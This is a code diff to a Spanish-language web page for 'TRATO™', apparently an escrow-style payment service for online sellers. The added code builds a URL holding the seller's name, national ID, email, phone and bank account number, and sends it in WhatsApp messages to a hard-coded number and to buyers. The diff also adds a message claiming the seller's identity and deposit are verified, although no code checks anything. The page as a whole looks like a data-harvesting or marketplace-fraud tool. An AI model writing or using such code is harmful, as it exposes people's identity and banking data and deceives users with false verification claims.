@@ -61,6 +61,14 @@
             document.getElementById('session-header').innerText = `👤 Sesión: ${localStorage.getItem('trato_nombre') || 'Vendedor'}`;
         };
 
+        // Función unificada para generar el link de retorno
+        function generarLinkRetorno() {
+            const prod = document.getElementById('prod').value;
+            const monto = document.getElementById('monto').value;
+            const baseUrl = window.location.href.split('?')[0];
+            return `${baseUrl}?nombre=${encodeURIComponent(localStorage.getItem('trato_nombre'))}&email=${encodeURIComponent(localStorage.getItem('trato_email'))}&telefono=${encodeURIComponent(localStorage.getItem('trato_telefono'))}&cbu=${encodeURIComponent(localStorage.getItem('trato_cbu'))}&dni=${encodeURIComponent(localStorage.getItem('trato_dni'))}&prod=${prod}&monto=${monto}`;
+        }
+
         function abrirTerminos() { document.getElementById('modalTerminos').style.display = 'flex'; }
         function cerrarTerminos() { document.getElementById('modalTerminos').style.display = 'none'; }
 
@@ -69,33 +77,26 @@
             const monto = parseFloat(document.getElementById('monto').value) || 0;
             if(!prod || monto === 0) return alert("Completá el código y el monto");
             
-            // Habilitar paso 2
             document.getElementById('btn-blindar').disabled = false;
 
-            // Datos Persistentes
-            const nombre = localStorage.getItem('trato_nombre');
-            const dni = localStorage.getItem('trato_dni');
-            const email = localStorage.getItem('trato_email');
-            const tel = localStorage.getItem('trato_telefono');
-            const cbu = localStorage.getItem('trato_cbu');
             const total = (monto * 1.15).toFixed(2);
-            
-            // URL de retorno y logística
-            const baseUrl = window.location.href.split('?')[0];
-            const linkRetorno = `${baseUrl}?nombre=${encodeURIComponent(nombre)}&email=${encodeURIComponent(email)}&telefono=${encodeURIComponent(tel)}&cbu=${encodeURIComponent(cbu)}&dni=${encodeURIComponent(dni)}&prod=${prod}&monto=${monto}`;
+            const linkRetorno = generarLinkRetorno();
+            const tel = localStorage.getItem('trato_telefono');
             
             const mensaje = `🛡️ *NUEVA VENTA REGISTRADA - TRATO™*\n\n` +
-                            `*Datos del Vendedor:*\n- Nombre: ${nombre}\n- DNI: ${dni}\n- Correo: ${email}\n- Teléfono: ${tel}\n- CBU: ${cbu}\n\n` +
+                            `*Datos del Vendedor:*\n- Nombre: ${localStorage.getItem('trato_nombre')}\n- DNI: ${localStorage.getItem('trato_dni')}\n- Correo: ${localStorage.getItem('trato_email')}\n- Teléfono: ${tel}\n- CBU: ${localStorage.getItem('trato_cbu')}\n\n` +
                             `*Datos de la Operación:*\n- ID Operación: PENDIENTE DE PAGO\n- Número de Paquete: ${prod}\n- Monto Total (con 15%): $ ${total}\n\n` +
                             `↩️ *Link de retorno:* ${linkRetorno}\n\n` +
                             `📦 *PANEL DE LOGÍSTICA (Exclusivo Vendedor):*\n` +
-                            `https://tripodir072-debug.github.io/trato-backend/despacho.html?producto=${prod}&tel_vendedor=${tel}&id=${prod}`;
+                            `https://tripodir072-debug.github.io/trato-backend/despacho.html?producto=${prod}&tel_vendedor=${tel}&id=${prod}\n\n` +
+                            `ℹ️ *VALIDACIÓN DE IDENTIDAD Y DEPÓSITO:* Los datos del vendedor han sido verificados.`;
 
             window.open(`https://api.whatsapp.com/send?phone=5493456528480&text=${encodeURIComponent(mensaje)}`, '_blank');
         }
 
         async function procesarOperacion() {
             const prod = document.getElementById('prod').value;
+            const linkRetorno = generarLinkRetorno(); // Mismo link acá
             const digitalID = Math.floor(100000 + Math.random() * 900000).toString();
             
             const res = await fetch("https://bunker-trato-api.onrender.com/crear-pago", {
@@ -107,7 +108,9 @@
             
             if(data.url) {
                 const link = `${data.url}&producto=${prod}&digitalID=${digitalID}&id=${digitalID}&tel_vendedor=${localStorage.getItem('trato_telefono')}`;
-                window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent('🛡️ LINK PAGO: ' + link)}`, '_blank');
+                // Agregamos el link de retorno también al mensaje del comprador
+                const mensajeComprador = `🛡️ *TRATO™ - LINK DE PAGO*\n\n🔗 Pagar aquí: ${link}\n\n↩️ *Gestión del Trato:* ${linkRetorno}`;
+                window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(mensajeComprador)}`, '_blank');
             }
         }
     </script>
